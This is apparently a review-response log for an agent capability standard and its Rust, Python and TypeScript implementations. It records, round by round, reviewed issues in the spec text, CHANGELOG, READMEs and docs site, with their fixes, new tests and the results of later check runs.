  `dest_bash.py` is F504 under the policy; `obs.py`'s `find` and `sort`
  commands are F501 in both modes; `failopen.py` replaces the result with
  R402 when the store fails; the three demos print what they say.
- Rust (`core/`, 1.99.1): `cargo test --locked` (no Rust source changed).
- TypeScript: `packages/acs-core` build, check, test (1816: the five new
  redaction vectors); the binding check and test (191, 2 skipped).
- Site: `npm run check`, `npm test` (1172), `npm run build` (check-dist),
  `scripts/check-runs.mjs` (0 enforced runs over 1800px: the SDK guide's
  Bash section was tightened after the first build measured 1856px; now
  1772px), and `scripts/check-axe.mjs` over the 14 pages this round
  changed (/guides/hooks/, /start/overview/, /spec/security/,
  /guides/running-workflows/, /guides/claude-agent-sdk/,
  /community/release-notes/, /spec/1.2.0/ and the six capability pages
  whose skills changed): no violations, no sideways scroll.

## Round 1 — typescript

Three issues, all real; none rejected. Two are documentation gaps (the
CHANGELOG, the binding README); the third (the package README's module
table) gains a test that fails on the old README.

1. **Two binding modules removed, the binding on the unpublished package,
   neither in the CHANGELOG (low).** Real. `git diff --stat
   origin/main...HEAD` deletes `examples/standard_agents/src/acs/canonical.ts`
   (`canonicalize`, `digest`, `sha256Hex`, `NotCanonicalizableError`,
   `Json`) and `src/acs/ontology.gen.ts` (`CAPABILITIES`, `ONTOLOGY_VERSION`,
   `REQUIRES`); main's `test/grounded.test.ts`, `canonical.test.ts` and
   `canonical_input.test.ts` import `../src/acs/canonical.js`, which no
   longer exists. The package is new on this branch (no `packages/acs-core`
   on origin/main), and the CHANGELOG had no entry introducing it either:
   only entries that name its later additions and its npm publishing. Its
   Added entry for `scripts/gen_standard_agents_binding.py` still said the
   script writes "the binding's ontology table ... and the digest fixtures",
   which it no longer does. Fix (`CHANGELOG.md`): an Upgrading bullet for
   the binding (both modules removed; the binding depends on
   `@synaptiai/acs-core` through `file:../../packages/acs-core` and imports
   its `dist/`, so `npm ci` and `npm run build:ts` there first; where each
   former export now comes from, `CAPABILITIES`, `REQUIRES` and
   `ONTOLOGY_VERSION` also through `src/acs/ontology.ts`; the binding's copy
   `test/fixtures/approval-digests.json` removed in favour of
   `tests/conformance/approval/digests.json`, which main already had; the
   package is on npm only once `publish-npm.yml` runs with
   `NPM_PUBLISH_ENABLED` and `NPM_TOKEN`, so a copy outside the repository
   builds or bundles it). An Added bullet introduces the package (0.1.0,
   its modules, the `./wasm` entry, tests reading the vectors in place, CI).
   The generator's Added bullet names what it writes now
   (`packages/acs-core/src/ontology.gen.ts`, the annotation schema,
   `tests/conformance/approval/digests.json`).
2. **The binding README's build steps fail on a fresh clone (medium).**
   Real, reproduced: a fresh `git clone` of this branch, then in
   `packages/acs-core` `npm ci` (exit 0) and `npm run build` (exit 1, ENOENT
   on `dist/acs_core.wasm` at `scripts/bundle-documents.mjs:12`, which loads
   the WebAssembly core to parse the schema documents). CLAUDE.md, AGENTS.md,
   ci.yml (`Build the TypeScript package`) and the package README already
   say the binding needs only `build:ts`. Fix
   (`examples/standard_agents/README.md`): `npm run build:ts`, with why
   (the binding imports only the plain-TypeScript entry; the full build
   bundles the documents through the WebAssembly core, which `build:wasm`
   builds with Rust). Verified in the same fresh clone: `npm ci`, `npm run
   build:ts` (exit 0), then in the binding `npm ci`, `npm run check` (exit
   0) and `npm test` (191 passed, 2 skipped). No other document gives the
   binding the full build (searched every tracked `.md`, `.ts`, `.mjs`,
   `.yml` and `.json` for `npm run build`). Documentation only, so no test.
3. **The package README's module table left out five exported modules
   (low).** Real: `src/index.ts` re-exports `agents`, `domains`,
   `families`, `ijson` and `issues`, and the table under "What it holds"
   (rendered at /guides/typescript-package/) listed none, so
   `parseJsonExact`, which spec/CONFORMANCE.md tells SL implementers the
   TypeScript runners use, was documented nowhere in the package. Fix
   (`packages/acs-core/README.md`): a row for each (`iJsonProblem` with
   its limits, `MAX_DEPTH` among them, and `parseJsonExact`;
   `manifestMaxima`, `joinMaxima`, `checkTask`, `workflowTarget`,
   `agentsApply`; `modelFamily`, `isModelFamily`; `isDomainId`,
   `selectImplementation`, `UnsupportedDomainError`; `issuePath`), each
   with its section; the opening list names what the entry holds as
   `src/index.ts`'s comment does; the list of vectors the tests read gains
   `output/vectors.json`, `agents/maxima.json`, `families/derive.json` and
   `domains/match.json`. Test: `test/package.test.ts` "lists in the
   README's module table every module the entry exports" compares the
   table's first column with the `export * from` lines of `src/index.ts`;
   with the old README it fails, naming the five modules.

### Checks after round 1 (typescript)

- TypeScript: `packages/acs-core` `build:wasm`, build, check, test (1817:
  the new README test); the binding check and test (191, 2 skipped). In a
  fresh clone, the binding README's corrected steps (`npm ci`, `npm run
  build:ts`, then the binding's `npm ci`, check and test) pass.
- Python: `validate_doc_links` (674 references); `pytest tests/` (4498
  passed, 18 skipped). No Python, Rust or generated file changed.
- Rust (`core/`, 1.99.1): `cargo test --locked` (no Rust source changed).
- Site: `npm run check`, `npm test` (1172), `npm run build` (check-dist),
  `scripts/check-runs.mjs` (0 enforced runs over 1800px) and
  `scripts/check-axe.mjs` over the three pages this round changed
  (/guides/typescript-package/, /community/release-notes/,
  /guides/examples/standard-agents/): no violations, no sideways scroll.

## Round 2 — standard-text, findings, docs-site, other

Nineteen issues: ten in the Standard text, two in the findings file, one in
the docs site, six in other documents. Each was verified first. All
nineteen were real and are fixed; one claim within issue 12 (RFC-0006's
"ten `approver_*` fixtures") was right as written and is clarified, not
changed. Where code or a fixture changed, the test that would have caught
the issue is named; each was mutation-checked (the old code restored, the
test fails).

### Standard text

1. **Recheck behaviour pinned by EX fixtures but never stated (high).**
   Real: §5.14 listed `compare` and `on_change` only, while
   `recheck_stop`, `recheck_replan`, `recheck_version`, `recheck_reask` and
   `resume_recheck_reask` pin what `machine.rs` `rechecked` does (the same
   code as on origin/main, apart from the record's 1.2 `code`). Fix: a
   **Recheck** paragraph in §5.14: after a valid approval and before the
   checkpoint is used the executor issues `RecheckSource` and compares the
   value read with the source's baseline (its value at the request, null
   when unresolved; after a re-ask, what that recheck read); `digest`
   compares the RFC 8785 digests, `version` the `version` members as `==`
   does, absent or not an object counting as null; on a change the record
   becomes `expired` and `reask` asks again with item 3's shown values (a
   new record, except a queued step a resumption continues, §5.14.1 items
   5 and 6), `replan` ends the run and every run it is nested in
   `Completed` `replan_required`, `stop` gives the record F502 and fails the
   step F502 (failure modes apply); an `Error` is F502. §5.2.2 lists the
   recheck among what can stop a step before it uses its checkpoint, the
   §5.14 record paragraph names the `expired` record, Appendix D.2 gains a
   clarification row and spec/CHANGELOG.md names it. No code changed; the
   five fixtures are the tests. The recheck fixtures' approval and recheck
   requests now also pin `step` (3), so the site can draw `recheck_reask`
   (below).
2. **Executor and safety layer checked one output differently (medium).**
   Real, reproduced: a 1.2 `search` step answered
   `{"results":[],"evidence_anchors":"file:a","confidence":2}` completed.
   Fix (the reviewer's preferred one): in a workflow that targets 1.2 or
   later the executor checks an `Output` as §5.18.9's consumer checks an
   output, as a layer does: an `evidence_anchors` that is not an array, or
   a required `confidence` that is not a number from 0 to 1 (a boolean is
   not), is R402 (retried as any R402), before grounding (F505) and a
   minimum confidence (F504); a 1.0 or 1.1 workflow is checked for its
   required fields only, as before (`core/src/exec/machine.rs`,
   `contract_value_problem`). Text: §5.19.1's `InvokeCapability` row,
   §5.20 (the check comes after the contract; item 1's F505 for a value
   that is not a list then applies only below 1.2), §5.21.3 (so
   `invalid_confidence` applies in 1.2 only to a confidence the contract
   does not require), §5.18.10 (the order), §11.6's parenthesis, Appendix
   D.3 and the CHANGELOG. Tests: eight runtime fixtures
   (`output_contract_anchors_not_an_array`, `_confidence_out_of_range`,
   `_confidence_not_a_number`, `_v11_unchecked`, `_retried`,
   `_before_grounding`, `_before_minimum_confidence`,
   `_unrequired_confidence`), played by Rust, Python and TypeScript
   (WebAssembly). Mutation checks: with the check off, the first fails;
   with it applied to every target, `_v11_unchecked` fails. No earlier
   fixture changed its outcome (361 played).
3. **§5.2.1 and §5.14 against §5.21.1 on `approval` under profiles
   (medium).** Real, reproduced (`--profile` with `block_autonomous:
   [retrieve]` still gives S303, as §5.21.1 says). Fix: §5.14 reads "the
   step's effective `requires_approval` before profiles (§5.2.1, §5.21.1)";
   §5.2.1's sentence excepts whether a step may carry `approval`.
4. **§9.1 omitted V102 for offered tools (low).** Real
   (`offered_missing_checkpoint` expects V102). §9.1 lists "V101, V102 (an
   offered tool that requires a capability no offered tool can perform,
   §5.18.2), V105, V107 and V109–V111".
5. **A binding's `domain` was never checked as a domain id (low).** Real
   (`"Image Object!"` loaded in both layers). Chosen: S303, as §5.18.1
   already said (tool bindings are new in 1.2, so no workflow relies on
   the looser form; a step's stays W620). Fix: the `domain` pattern in
   `tool_binding.schema.json` and, through `gen_standard_agents_binding.py`,
   the annotation schema; both loaders check it
   (`grounded_agency/capabilities/bindings.py`, imported lazily as the
   module's `_core` is, since `grounded_agency.workflows` imports the
   capabilities package; `packages/acs-core/src/binding.ts` with
   `isDomainId`); §5.18.1's row says so. Tests: binding fixtures
   `domain_not_a_domain_id` (S303, not loaded) and `domain_id_loads`
   (`image.object`), 35 binding fixtures; each loader with the old code
   fails the first.
6. **§2 and W602 misstated a delegate step's baseline (low).** Real
   (reproduced W602 for `risk: low` on a read-only delegation). Both now
   say "the ontology's flags, raised for a `delegate` step of a workflow
   with `agents` by its target maxima (§5.15.2)", and §5.15.2's W602
   sentence names both values.
7. **§5.14.1 item 5 spoke of a retry asking again (low).** Real: a retry
   does not ask (§5.13), reproduced (a re-entered queued `mutate` with
   `retry: {max: 1}` that fails once: one `RequestApproval`, then attempts
   1 and 2). Item 5 now says "after a recheck too, and when a recovery
   loop runs it again before it goes on (items 6, 7). (A retry does not ask
   again, §5.13.)"; the descriptions of `resume_retry_keeps_queue` and
   `resume_deferred_handler_loop` (both use a recovery loop), RFC-0006 A5,
   A7 and its rejected alternative, and the running-workflows guide follow.
8. **Cross-references and protocol tables (low).** Real, each: §4.5's
   `run` row cites §5.12; §10.5's list adds §5.11–§5.18, §5.19.3,
   §5.19.5, §5.19.7, §5.19.8, §6.5 and §9 (checked against
   `NORMATIVE_MEMBERS`); §5.19.1's `InvokeCapability` row names
   `store_as`; §5.19.7's `unsupported_ttl` row adds a ttl past
   9999-12-31T23:59:59.999Z.
9. **Normative references incomplete (low).** Real. §1.1 and §13.1 add RFC
   2104 (HMAC-SHA-256), RFC 3339, FIPS 180-4 (SHA-256) and JSON Lines,
   and give RFC 6901, 7493 and 8785 every section that relies on them
   (found by a scan of the text).
10. **Appendix D named the new §2 terms only in D.1 and D.7 (low).** Real:
    27 terms are new since 1.1. D.3, D.4, D.5 and D.6 each gain a "The
    terms ... (§2)" bullet with the 18 the reviewer listed.

### Findings

15. **Seven answered questions had no `answer`; the field was
    undocumented (low).** Real. ACS-Q05, Q06, Q09, Q11, Q12, Q13 and Q14
    now carry an answer with the section and the RFC decision (Q10 and Q15
    stay open); `index.yaml` gains `question_fields`, and
    `tests/test_standard_agents_mapping.py` checks every question's fields
    against it, `depends`, and that only this standard's questions are
    answered, each citing a section.
16. **ACS-61's resolution described a YAML example the guide no longer
    has (low).** Real (the subsection's only YAML is the 1.2 `agents`
    example, W621 without the deployer's manifest, reproduced). The
    resolution now says so and that 1.1's raised-flags workaround is
    prose.

### Docs site

12. **Stale status, version and counts (low).** Real, except one count:
    the running-workflows guide points at "Normative vectors of Standard
    1.2.0"; EDGE_TYPES.md is Version 1.2.0, dated as the Standard
    (2026-11-15); RFC-0005 says 35 binding and 30 call-sequence fixtures.
    RFC-0006's "ten `approver_*` fixtures" were the ten it added
    (`approver_unavailable_attended` is on origin/main, from 1.1); it now
    says "ten new ... (the eleventh ... is 1.1's)".

The site's checks found three more things, fixed here:

- The figure-gap sweep (CI's headless shell 1248) failed two runs of
  /spec/1.2.0/ after the text above. The run from the page top crossed the
  longer §1.1, a reference list as §13 is: `runs.ts` exempts §1.1
  (category c, as §13, §9.8 and §11.7), with `test/runs.test.ts`. The
  §5.14 run between "An approval no one is asked for" and "What a
  deferral reaches" was 2303px: the first figure moves after the
  paragraph on modes in an unattended run (which it illustrates), and a
  new figure, "A changed source, asked again" (`recheck-replay`, from
  `recheck_reask`), follows the recheck list; the runs are now 976, 1724
  and 426px. The deferral figure's slot follows its list (index 4), and
  the replay words read a `Current` answer as "the source was read
  again".
- /guides/claude-agent-sdk/ failed the sweep on HEAD too (1800.x px,
  identical HTML before and after this round): round 1 measured it at
  1772px, and nothing changed since, so the two measurements disagree by
  a line. Two sentences of its Unbound Tools and `git stash` paragraphs
  are tightened: 1744px.
- SECURITY.md's ordering diagram, with `constrain` added, was 742px wide:
  the edge labels go, the title says the edges are `precedes`.

### Other

11. **CONFORMANCE.md and SECURITY.md diverged from the Standard (low).**
    Real (reproduced V102 for checkpoint, mutate, constrain). CONFORMANCE's
    L1 list gains unique `store_as`, catalog manifests and catalog-set
    `invoke`, agent manifests, and locations with `path`; SECURITY §1.2
    (text and diagram) and §3.2 state `constrain`'s `precedes` edges
    (V102 when present after), `generate` included.
13. **The integration guide said the layers refuse a destination
    profile (medium).** Real, reproduced (the adapter constructs with
    `allowed_destinations` and applies it). It now says they apply
    destination policies (`allowed_destinations`, §4.4.2); a search found
    no other copy of the old sentence.
14. **Upgrading omitted Fixed behaviour changes and overstated one
    (medium).** Real, against v2.0.0 (its `adapter.py` replaced
    `can_use_tool` and its evidence store kept `tool_input`;
    `register_mcp_tool('mcp__x__y', 'no_such_capability')` now raises
    V101). Upgrading gains `wrap_options()` chaining (Fixed),
    `register_mcp_tool` (Fixed) and anchors that no longer keep a tool's
    input (Fixed); the PreToolUse bullet says strict mode, with the
    non-strict behaviour and the rate check's R407 in either mode.
17. **CHANGELOG's S2b fixture count (low).** Real (`s2b.py` registers 45).
    Now 45; the binding fixture count is 35, and the executor entry names
    the eight `output_contract_*` fixtures.
18. **todo.md's Phase 4 summary (low).** Real. It now says 19 distinct,
    18 real, the `header` keyword already documented, and that every real
    issue was fixed and the other recorded with its evidence.
19. **WORKFLOW_ROADMAP.md showed `plan-invalidation` (low).** Real. Now
    `plan_invalidation`; new `tests/test_workflow_roadmap.py` compares the
    roadmap's count, names, goals, risks and steps (domains in brackets,
    `invoke` targets in parentheses) with the catalog, and fails on the old
    text.

The running-workflows guide's snapshot figures are re-measured over the 361
fixtures as round 1 did: 1.2 to 35 kB, median 2.7 kB (2.8 without the eight
new one-step fixtures), trace 42% mean and 47% of all bytes; after taking,
1.0 to 12 kB, median 1.4 kB.

### Checks after round 2 (standard-text, findings, docs-site, other)

- Python: every `tools/validate_*.py`, `validate_workflows.py --strict`,
  every domain catalog and example `--strict`; the generators' `--check`
  (`sync_skill_schemas` 107, `gen_runtime_fixtures` 361,
  `gen_call_fixtures` 35 and 30, `gen_trigger_vectors`,
  `gen_standard_agents_binding`, `gen_capability_json_schemas`); ruff
  check and format (CI's list); mypy; `pytest tests/` (4510 passed, 18
  skipped); `benchmarks/tests/` (69); `scripts/run_conformance.py`.
- Rust (`core/`, 1.99.1; extension rebuilt): fmt; clippy plain, `python`
  and `wasm`; `cargo test --locked` (the timing test included);
  `--features wasm --test wasm` (13); MSRV `cargo +1.88.0 check --locked
  --all-targets --features python`. No expression changed, so the CEL
  differential was not rerun.
- TypeScript: `packages/acs-core` `build:wasm`, build, check, test (1843);
  the binding check and test (191, 2 skipped).
- Site: `npm run check`, `npm test` (1173), `npm run build` (check-dist),
  `scripts/check-runs.mjs` with CI's headless shell (0 enforced runs over
  1800px; /spec/1.2.0/'s longest 1795px, the SDK guide's 1793px, both
  unchanged by this round) and `scripts/check-axe.mjs` over the twelve
  pages this round changed (/spec/1.2.0/, /spec/security/,
  /spec/conformance/, /spec/edge-types/, /spec/changelog/, /rfcs/0005/,
  /rfcs/0006/, /guides/running-workflows/, /guides/standard-agents/,
  /guides/claude-agent-sdk/, /community/release-notes/,
  /workflows/roadmap/): no violations, no sideways scroll.
